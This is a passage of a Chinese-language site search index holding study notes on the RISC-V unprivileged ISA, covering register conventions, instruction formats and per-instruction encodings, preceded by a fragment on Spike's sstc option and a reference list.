\u4e0a\u542f\u7528 sstc \u9700\u8981\u81ea\u5df1\u8bbe\u5b9a isa\uff0c\u5373\u52a0\u4e00\u4e2a <code>--isa=RV64gc_zicntr_sstc</code>\uff0c\u7136\u540e\u5728 GDB \u8c03\u8bd5\u7684\u65f6\u5019 <code>i r stimecmp</code> \u5c31\u80fd\u67e5\u770b\u5230 stimecmp \u7684\u503c\u4e86\uff08qemu \u751a\u81f3\u4e0d\u8ba9\u770b stimecmp\uff09\u3002</p>"},{"location":"cs/pl/riscv/spike/#_3","title":"\u53c2\u8003","text":"<ul> <li>https://openocd.org/doc/html/</li> <li>https://tinylab.org/riscv-semihosting/</li> <li>https://blog.csdn.net/luolaihua2018/article/details/127344891</li> <li>https://zhuanlan.zhihu.com/p/506062424</li> </ul>"},{"location":"cs/pl/riscv/unprivileged/","title":"RISC-V \u975e\u7279\u6743\u7ea7 ISA","text":"<p> \u7ea6 4193 \u4e2a\u5b57  22 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 14 \u5206\u949f</p> <p>Abstract</p> <p>RISC-V \u6307\u4ee4\u96c6\u7684\u975e\u7279\u6743\u7ea7\uff08\u7528\u6237\u7ea7\uff09\u90e8\u5206\u3002</p> <p>\u53c2\u8003\uff1a</p> <ul> <li>The RISC-V Instruction Set Manual Volume I: Unprivileged ISA v.20191213</li> <li>\u6d59\u6c5f\u5927\u5b66 \u201c\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u201c\uff08\u5927\u4e00\u6625\u590f\uff09\u201c\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 \u201c\uff08\u5927\u4e8c\u79cb\u51ac\uff09\u8bfe\u7a0b</li> </ul>"},{"location":"cs/pl/riscv/unprivileged/#rv32i","title":"RV32I \u57fa\u7840","text":""},{"location":"cs/pl/riscv/unprivileged/#_1","title":"\u5bc4\u5b58\u5668","text":"<ul> <li>\u4e00\u4e2a PC \u5bc4\u5b58\u5668\uff08program counter\uff09</li> <li>32 \u4e2a 32 \u4f4d\u5bc4\u5b58\u5668\uff08x0~x31\uff09<ul> <li>\u5176\u4e2d x0 \u6c38\u8fdc\u662f 0</li> </ul> </li> </ul> <p>\u5bc4\u5b58\u5668\u7684\u5e38\u7528\u7528\u9014\u5982\u4e0b\uff1a</p> \u5bc4\u5b58\u5668 ABI \u540d\u79f0 \u7528\u9014\u63cf\u8ff0 saver x0 zero \u786c\u4ef6 0 x1 ra \u8fd4\u56de\u5730\u5740\uff08return address\uff09 caller x2 sp \u6808\u6307\u9488\uff08stack pointer\uff09 callee x3 gp \u5168\u5c40\u6307\u9488\uff08global pointer\uff09 x4 tp \u7ebf\u7a0b\u6307\u9488\uff08thread pointer\uff09 x5 t0 \u4e34\u65f6\u53d8\u91cf/\u5907\u7528\u94fe\u63a5\u5bc4\u5b58\u5668\uff08alternate link reg\uff09 caller x6-7 t1-2 \u4e34\u65f6\u53d8\u91cf caller x8 s0/fp \u9700\u8981\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668/\u5e27\u6307\u9488\uff08frame pointer\uff09 callee x9 s1 \u9700\u8981\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668 callee x10-11 a0-1 \u51fd\u6570\u53c2\u6570/\u8fd4\u56de\u503c caller x12-17 a2-7 \u51fd\u6570\u53c2\u6570 caller x18-27 s2-11 \u9700\u8981\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668 callee x28-31 t3-6 \u4e34\u65f6\u53d8\u91cf caller <p>\u5176\u4e2d sp s0-11 \u9700\u8981\u5728\u51fd\u6570\u8c03\u7528\u524d\u540e\u4fdd\u8bc1\u4e00\u81f4\uff0c\u5176\u5b83\u4e0d\u7528\u4fdd\u8bc1</p>"},{"location":"cs/pl/riscv/unprivileged/#_2","title":"\u6307\u4ee4\u683c\u5f0f","text":"<p>RV32I \u6709 4 \u79cd\u57fa\u7840\u7684\u6307\u4ee4\u683c\u5f0f\uff08R/I/S/U\uff09\uff0c\u518d\u6839\u636e\u7acb\u5373\u6570\u89e3\u7801\u7684\u4e0d\u540c\u53c8\u5206\u51fa\u4e24\u79cd\uff08B/J\uff09\uff0c\u603b\u5171\u516d\u79cd\u6307\u4ee4\u683c\u5f0f</p>"},{"location":"cs/pl/riscv/unprivileged/#r","title":"R \u578b\u6307\u4ee4","text":"31 25 24 20 19 15 14 12 11 7 6 0 funct7 rs2 rs1 funct3 rd opcode <p>\u4f7f\u7528\u5bc4\u5b58\u5668\u8fdb\u884c\u6570\u5b57\u903b\u8f91\u8fd0\u7b97\u7684\u6307\u4ee4\u683c\u5f0f\uff0c\u8fd0\u7b97\u7531 opcode funct3 funct7 \u51b3\u5b9a\uff0crd = rs1 op rs2\uff08shift \u7c7b\u4f8b\u5916\uff0c\u5b83\u4eec\u7528 rs2 \u4f4d\u7f6e\u8868\u793a\u79fb\u4f4d\u6570\u7684\u7acb\u5373\u6570\uff09</p>"},{"location":"cs/pl/riscv/unprivileged/#i","title":"I \u578b\u6307\u4ee4","text":"31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 funct3 rd opcode <p>\u4f7f\u7528\u5bc4\u5b58\u5668\u548c\u7acb\u5373\u6570\u8fdb\u884c\u6570\u5b57\u903b\u8f91\u8fd0\u7b97\uff0c\u4ee5\u53ca load \u7c7b\u6307\u4ee4\u7b49\u7684\u6307\u4ee4\u683c\u5f0f\uff0c\u8fd0\u7b97\u7c7b\u578b\u7b49\u7531 opcode funct3 \u51b3\u5b9a\uff0c\u5982\u679c\u662f ALU \u8fd0\u7b97\uff0c\u5219 rd = rs1 op imm</p> <p>\u7acb\u5373\u6570\u662f {{20{inst[31]}}, inst[31:20]}\uff0c\u4e5f\u5c31\u662f\u5bf9 imm[11:0] \u8fdb\u884c\u7b26\u53f7\u4f4d\u6269\u5c55\u5230 32 \u4f4d</p>"},{"location":"cs/pl/riscv/unprivileged/#s","title":"S \u578b\u6307\u4ee4","text":"31 25 24 20 19 15 14 12 11 7 6 0 imm[11:5] rs2 rs1 funct3 imm[4:0] opcode <p>store \u7c7b\u6307\u4ee4\uff0cstore \u7684\u5927\u5c0f\u7531 funct3 \u51b3\u5b9a\uff0c\u4ee5\u53d8\u5740\u6a21\u5f0f\u8fdb\u884c\u5bfb\u5740\uff0c\u5373 rs1 = [rs2+imm]</p> <p>\u7acb\u5373\u6570\u662f {{20{inst[31]}}, inst[31:25], inst[11:7]}</p>"},{"location":"cs/pl/riscv/unprivileged/#b","title":"B \u578b\u6307\u4ee4","text":"31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 funct3 imm[4:1,11] opcode <p>\u7531 S \u578b\u6307\u4ee4\u5206\u6765\uff0c\u4e0e\u4e4b\u533a\u522b\u662f\u7acb\u5373\u6570\u8bfb\u53d6\u987a\u5e8f\u4e0d\u540c\uff0c\u662f\u6240\u6709\u5206\u652f\u7c7b\u6307\u4ee4\u3002\u662f\u5426\u5206\u652f\u7531 funct3 rs1 rs2 \u51b3\u5b9a</p> <p>\u7acb\u5373\u6570\u662f {{19{inst[31]}}, inst[31], inst[7], inst[30:25], inst[11:8], 1'b0}</p>"},{"location":"cs/pl/riscv/unprivileged/#u","title":"U \u578b\u6307\u4ee4","text":"31 12 11 7 6 0 imm[31:12] rd opcode <p>LUI \u548c AUIPC\uff0c\u7acb\u5373\u6570\u90fd\u662f\u5728\u9ad8 20 \u4f4d\uff0c\u800c\u4e14\u6ca1\u6709\u6e90\u64cd\u4f5c\u6570</p> <p>\u7acb\u5373\u6570\u662f {inst[31:12], 12'b0}</p>"},{"location":"cs/pl/riscv/unprivileged/#j","title":"J \u578b\u6307\u4ee4","text":"31 12 11 7 6 0 imm[20,10:1,11,19:12] rd opcode <p>\u7531 U \u578b\u6307\u4ee4\u5206\u6765\uff0c\u533a\u522b\u4e5f\u662f\u7acb\u5373\u6570\u8bfb\u53d6\u4e0d\u540c\uff0c\u4ec5\u6709 JAL \u4e00\u4e2a\u6307\u4ee4</p> <p>\u7acb\u5373\u6570\u662f {{11{inst[31]}}, inst[31], inst[19:12], inst[20], inst[30:21], 1'b0}</p>"},{"location":"cs/pl/riscv/unprivileged/#rv32i_1","title":"RV32I \u6307\u4ee4","text":""},{"location":"cs/pl/riscv/unprivileged/#_3","title":"\u6574\u578b\u8ba1\u7b97\u6307\u4ee4","text":""},{"location":"cs/pl/riscv/unprivileged/#_4","title":"\u52a0\u51cf\u6cd5\u6307\u4ee4","text":"add R \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 000 rd 0110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aadd rd, rs1, rs2</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1ard = rs1 + rs2</li> <li>\u6ce8\u610f\uff1a\u6ea2\u51fa\u4f1a\u88ab\u5ffd\u7565</li> </ul> sub r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0100000 rs2 rs1 000 rd 0110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asub rd, rs1, rs2</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1ard = rs1 - rs2</li> <li>\u6ce8\u610f\uff1a\u6ea2\u51fa\u4f1a\u88ab\u5ffd\u7565</li> </ul> addi I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 000 rd 0010011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aaddi rd, rs1, imm</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1ard = rs1 + imm</li> <li>\u6ce8\u610f\uff1a\u6ea2\u51fa\u4f1a\u88ab\u5ffd\u7565\uff0cimm \u5728 [-2048, 2047] \u8303\u56f4\u5185</li> </ul>"},{"location":"cs/pl/riscv/unprivileged/#_5","title":"\u6bd4\u8f83\u8fd0\u7b97\u6307\u4ee4","text":"slt r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 010 rd 0110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aslt rd, rs1, rs2</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\uff08set less than\uff09\u5982\u679c rs1 &lt; rs2 \u5219 rd = 1\uff0c\u5426\u5219 rd = 0</li> <li>\u6ce8\u610f\uff1ars1 rs2 \u4f1a\u88ab\u89c6\u4e3a\u6709\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83</li> </ul> sltu r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 011 rd 0110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asltu rd, rs1, rs2</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\uff08set less than unsigned\uff09\u5982\u679c rs1 &lt; rs2 \u5219 rd = 1\uff0c\u5426\u5219 rd = 0</li> <li>\u6ce8\u610f\uff1ars1 rs2 \u4f1a\u88ab\u89c6\u4e3a\u65e0\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83</li> </ul> slti I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 010 rd 0010011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aslti rd, rs1, imm</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\uff08set less than immediate\uff09\u5982\u679c rs1 &lt; imm \u5219 rd = 1\uff0c\u5426\u5219 rd = 0</li> <li>\u6ce8\u610f\uff1aimm \u5728 [-2048, 2047] \u8303\u56f4\u5185\uff0c\u88ab\u89c6\u4e3a\u6709\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83</li> </ul> sltiu I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 011 rd 0010011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asltiu rd, rs1, imm</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\uff08set less than immediate unsigned\uff09\u5982\u679c rs1 &lt; imm \u5219 rd = 1\uff0c\u5426\u5219 rd = 0</li> <li>\u6ce8\u610f\uff1aimm \u5728 [-2048, 2047] \u8303\u56f4\u5185\uff0crs1 imm \u88ab\u89c6\u4e3a\u65e0\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83</li> </ul>"},{"location":"cs/pl/riscv/unprivileged/#_6","title":"\u4e8c\u8fdb\u5236\u4f4d\u8fd0\u7b97\u6307\u4ee4","text":"and r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 111 rd 0110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aand rd, rs1, rs2</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1ard = rs1 &amp; rs2 \u6309\u4f4d\u4e0e</li> </ul> or r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 110 rd 0110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aor rd, rs1, rs2</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1ard = rs1 | rs2 \u6309\u4f4d\u6216</li> </ul> xor r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 100 rd 0110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1axor rd, rs1, rs2</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1ard = rs1 ^ rs2 \u6309\u4f4d\u5f02\u6216</li> </ul> andi I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 111 rd 0010011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aandi rd, rs1, imm</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1ard = rs1 &amp; imm \u6309\u4f4d\u4e0e</li> <li>\u6ce8\u610f\uff1aimm \u5728 [-2048, 2047] \u8303\u56f4\u5185\uff0c\u4f1a\u6269\u5c55\u7b26\u53f7\u4f4d</li> </ul> ori I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 110 rd 0010011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aori rd, rs1, imm</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1ard = rs1 | imm \u6309\u4f4d\u6216</li> <li>\u6ce8\u610f\uff1aimm \u5728 [-2048, 2047] \u8303\u56f4\u5185\uff0c\u4f1a\u6269\u5c55\u7b26\u53f7\u4f4d</li> </ul> xori I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 100 rd 0010011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1axori rd, rs1, imm</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1ard = rs1 ^ imm \u6309\u4f4d\u5f02\u6216</li> <li>\u6ce8\u610f\uff1aimm \u5728 [-2048, 2047] \u8303\u56f4\u5185\uff0c\u4f1a\u6269\u5c55\u7b26\u53f7\u4f4d\uff08xori rd, rs1, -1 \u76f8\u5f53\u4e8e rd = ~rs1\uff09</li> </ul>"},{"location":"cs/pl/riscv/unprivileged/#_7","title":"\u79fb\u4f4d\u8fd0\u7b97\u6307\u4ee4","text":"sll r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 001 rd 0110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asll rd, rs1, rs2</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1ard = rs1 &lt;&lt; rs2[4:0] \u5de6\u79fb\uff08\u5de6\u4fa7\u4e22\u6389\uff0c\u53f3\u4fa7\u8865 0\uff09</li> <li>\u6ce8\u610f\uff1a\u4f1a\u53d6 rs2 \u5185\u6570\u503c\u7684\u4f4e 5 \u4f4d\u8fdb\u884c\u8fd0\u7b97</li> </ul> srl r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 101 rd 0110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asrl rd, rs1, rs2</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1ard = rs1 &gt;&gt; rs2[4:0] \u903b\u8f91\u53f3\u79fb\uff08\u5de6\u4fa7\u8865 0\uff0c\u53f3\u4fa7\u4e22\u6389\uff09</li> <li>\u6ce8\u610f\uff1a\u4f1a\u53d6 rs2 \u5185\u5bb9\u7684\u4f4e 5 \u4f4d </li> </ul> sra r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0100000 rs2 rs1 101 rd 0110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asra rd, rs1, rs2</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1ard = rs1 &gt;&gt;&gt; rs2[4:0] \u7b97\u6570\u53f3\u79fb\uff08\u5de6\u4fa7\u8865\u7b26\u53f7\u4f4d\uff0c\u53f3\u4fa7\u4e22\u6389\uff09</li> <li>\u6ce8\u610f\uff1a\u4f1a\u53d6 rs2 \u5185\u5bb9\u7684\u4f4e 5 \u4f4d\u8fdb\u884c\u8fd0\u7b97</li> </ul> slli i \u578b\uff08\u6539\uff09 31 25 24 20 19 15 14 12 11 7 6 0 0000000 shamt rs1 001 rd 0010011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aslli rd, rs1, shamt</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1ard = rs1 &lt;&lt; shamt \u5de6\u79fb\uff08\u5de6\u4fa7\u4e22\u6389\uff0c\u53f3\u4fa7\u8865 0\uff09</li> <li>\u6ce8\u610f\uff1ashamt\uff08shift amount\uff09\u4f1a\u7f16\u7801\u5230\u539f\u6765 rs2 \u7684\u4f4d\u7f6e\uff0c\u5b83\u662f\u4e00\u4e2a\u7acb\u5373\u6570\uff0c\u6b63\u597d\u6709 5 \u4f4d</li> </ul> srli i \u578b\uff08\u6539\uff09 31 25 24 20 19 15 14 12 11 7 6 0 0000000 shamt rs1 101 rd 0010011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asrli rd, rs1, shamt</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1ard = rs1 &gt;&gt; shamt \u903b\u8f91\u53f3\u79fb\uff08\u5de6\u4fa7\u8865 0\uff0c\u53f3\u4fa7\u4e22\u6389\uff09</li> <li>\u6ce8\u610f\uff1ashamt\uff08shift amount\uff09\u4f1a\u7f16\u7801\u5230\u539f\u6765 rs2 \u7684\u4f4d\u7f6e\uff0c\u5b83\u662f\u4e00\u4e2a\u7acb\u5373\u6570\uff0c\u6b63\u597d\u6709 5 \u4f4d</li> </ul> srai i \u578b\uff08\u6539\uff09 31 25 24 20 19 15 14 12 11 7 6 0 0100000 shamt rs1 101 rd 0010011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asrai rd, rs1, shamt</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1ard = rs1 &gt;&gt;&gt; shamt \u7b97\u6570\u53f3\u79fb\uff08\u5de6\u4fa7\u8865\u7b26\u53f7\u4f4d\uff0c\u53f3\u4fa7\u4e22\u6389\uff09</li> <li>\u6ce8\u610f\uff1ashamt\uff08shift amount\uff09\u4f1a\u7f16\u7801\u5230\u539f\u6765 rs2 \u7684\u4f4d\u7f6e\uff0c\u5b83\u662f\u4e00\u4e2a\u7acb\u5373\u6570\uff0c\u6b63\u597d\u6709 5 \u4f4d</li> </ul>"},{"location":"cs/pl/riscv/unprivileged/#_8","title":"\u6570\u636e\u52a0\u8f7d\u6307\u4ee4","text":"lui U \u578b 31 12 11 7 6 0 imm[31:12] rd 0110111 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1alui imm</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\uff08load upper immediate\uff09rd = imm &lt;&lt; 12 \u5c06 imm \u52a0\u8f7d\u5230 rd \u7684\u9ad8 20 \u4f4d</li> <li>\u6ce8\u610f\uff1aimm \u4e0d\u80fd\u8d85\u8fc7 20 \u4f4d\uff0crd \u4ee5\u5341\u516d\u8fdb\u5236\u8868\u793a\u5c31\u662f imm \u540e\u63a5\u4e09\u4e2a 0</li> </ul> auipc U \u578b 31 12 11 7 6 0 imm[31:12] rd 0010111 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aauipc rd</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\uff08add upper immediate with pc\uff09rd = pc + imm &lt;&lt; 12 \u5c06 imm \u52a0\u8f7d\u5230\u9ad8 20 \u4f4d\uff0c\u7136\u540e\u52a0\u4e0a pc \u503c</li> <li>\u6ce8\u610f\uff1a\u5e38\u7528\u6765\u6784\u5efa pc \u76f8\u5bf9\u5bfb\u5740\u7684\u5730\u5740\uff0cimm \u4e0d\u80fd\u8d85\u8fc7 20 \u4f4d</li> </ul>"},{"location":"cs/pl/riscv/unprivileged/#_9","title":"\u63a7\u5236\u6d41\u53d8\u5316\u6307\u4ee4","text":""},{"location":"cs/pl/riscv/unprivileged/#jump","title":"jump \u7c7b\u65e0\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4","text":"jal J \u578b 31 12 11 7 6 0 imm[20,10:1,11,19:12] rd 1101111 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1ajal rd, imm</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\uff08jump and link\uff09rd = pc+4, pc = pc+imm \u5373\u5c06\u5f53\u524d\u6307\u4ee4\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u5b58\u5165 rd\uff0c\u7136\u540e\u76f8\u5bf9\u8df3\u8f6c\u5230 imm \u5904</li> <li>\u6ce8\u610f\uff1aimm \u5728\u6c47\u7f16\u7a0b\u5e8f\u4e2d\u4e00\u822c\u7528\u6807\u53f7\u6765\u6307\u5b9a\uff0cjal \u53ef\u4ee5\u8df3\u5230 \u00b11MiB \u8303\u56f4\u5185\u7684\u4ee3\u7801</li> </ul> jalr I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 000 rd 1100111 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1ajalr rd, imm(rs1)</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1ard = pc+4, pc = (imm+rs1) &amp; 0xFFFFFFFE \u5373\u6700\u4f4e\u4f4d\u4f1a\u88ab\u8bbe\u4e3a 0</li> <li>\u6ce8\u610f\uff1a\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u4f4d\u7f6e\u8df3\u8f6c</li> </ul>"},{"location":"cs/pl/riscv/unprivileged/#branch","title":"branch \u7c7b\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4","text":"beq B \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 000 imm[4:1,11] 1100011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1abeq rs1, rs2, imm</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\uff08branch if equal\uff09\u5982\u679c rs1 == rs2\uff0c\u5219 pc = pc+imm</li> <li>\u6ce8\u610f\uff1a\u53ef\u4ee5\u8df3\u8f6c\u5230 \u00b14KiB \u8303\u56f4\u5185</li> </ul> bne B \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 001 imm[4:1,11] 1100011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1abne rs1, rs2, imm</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\uff08branch if not equal\uff09\u5982\u679c rs1 != rs2\uff0c\u5219 pc = pc+imm</li> <li>\u6ce8\u610f\uff1a\u53ef\u4ee5\u8df3\u8f6c\u5230 \u00b14KiB \u8303\u56f4\u5185</li> </ul> blt B \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 100 imm[4:1,11] 1100011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1ablt rs1, rs2, imm</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\uff08branch if less than\uff09\u5982\u679c rs1 &lt; rs2 \u5219 pc = pc+imm</li> <li>\u6ce8\u610f\uff1ars1 rs2 \u89c6\u4e3a\u6709\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83\uff0c\u53ef\u4ee5\u8df3\u8f6c\u5230 \u00b14KiB \u8303\u56f4\u5185</li> </ul> bge B \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 101 imm[4:1,11] 1100011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1abge rs1, rs2, imm</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\uff08branch if greater than or equal\uff09\u5982\u679c rs1 &gt;= rs2 \u5219 pc = pc+imm</li> <li>\u6ce8\u610f\uff1ars1 rs2 \u89c6\u4e3a\u6709\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83\uff0c\u53ef\u4ee5\u8df3\u8f6c\u5230 \u00b14KiB \u8303\u56f4\u5185</li> </ul> bltu B \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 110 imm[4:1,11] 1100011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1abltu rs1, rs2, imm</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\uff08blt unsigned\uff09\u5982\u679c rs1 &lt; rs2 \u5219 pc = pc+imm</li> <li>\u6ce8\u610f\uff1ars1 rs2 \u89c6\u4e3a\u65e0\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83\uff0c\u53ef\u4ee5\u8df3\u8f6c\u5230 \u00b14KiB \u8303\u56f4\u5185</li> </ul> bgeu B \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 111 imm[4:1,11] 1100011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1abgeu rs1, rs2, imm</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\uff08bge unsigned\uff09\u5982\u679c rs1 &gt;= rs2 \u5219 pc = pc+imm</li> <li>\u6ce8\u610f\uff1ars1 rs2 \u89c6\u4e3a\u65e0\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83\uff0c\u53ef\u4ee5\u8df3\u8f6c\u5230 \u00b14KiB \u8303\u56f4\u5185</li> </ul>"},{"location":"cs/pl/riscv/unprivileged/#_10","title":"\u88c5\u8f7d\u5b58\u50a8\u6307\u4ee4","text":""},{"location":"cs/pl/riscv/unprivileged/#load","title":"load \u7c7b\u88c5\u8f7d\u6307\u4ee4","text":"lb I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 000 rd 0000011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1alb rd, imm(rs1)</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\u5230 rd \u4f4e\u516b\u4f4d\uff0c\u518d\u8fdb\u884c\u7b26\u53f7\u6269\u5c55</li> </ul> lh I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 001 rd 0000011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1alh rd, imm(rs1)</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6\u4e00\u4e2a 16 \u4f4d\u6570\u5230 rd \u4f4e 16 \u4f4d\uff0c\u7136\u540e\u8fdb\u884c\u7b26\u53f7\u6269\u5c55</li> </ul> lw I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 010 rd 0000011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1alw rd, imm(rs1)</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6\u4e00\u4e2a 32 \u4f4d\u6570\u5230 rd \u4e2d</li> </ul> lbu I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 100 rd 0000011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1albu rd, imm(rs1)</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\u653e\u5230 rd \u4f4e 8 \u4f4d\uff0c\u7136\u540e\u8fdb\u884c\u96f6\u6269\u5c55\uff08\u9ad8\u4f4d\u5168\u8865 0\uff09</li> </ul> lhu I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 101 rd 0000011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1alhu rd, imm(rs1)</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6 16 \u4f4d\u6570\u5b58\u5165 rd\uff0c\u5e76\u8fdb\u884c\u96f6\u6269\u5c55\uff08\u9ad8 16 \u4f4d\u5168\u4e3a 0\uff09</li> </ul>"},{"location":"cs/pl/riscv/unprivileged/#store","title":"store \u7c7b\u5b58\u50a8\u6307\u4ee4","text":"sb S \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[11:5] rs2 rs1 000 imm[4:0] 0100011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asb rs2, imm(rs1)</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 rs2 \u7684\u4f4e 8 \u4f4d\u62f7\u8d1d\u5230 rs1 + imm \u5904\u5185\u5b58\u4e2d</li> </ul> sh S \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[11:5] rs2 rs1 001 imm[4:0] 0100011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1ash rs2, imm(rs1)</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 rs2 \u7684\u4f4e 16 \u4f4d\u62f7\u8d1d\u5230 rs1 + imm \u5904\u5185\u5b58\u4e2d</li> </ul> sw S \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[11:5] rs2 rs1 010 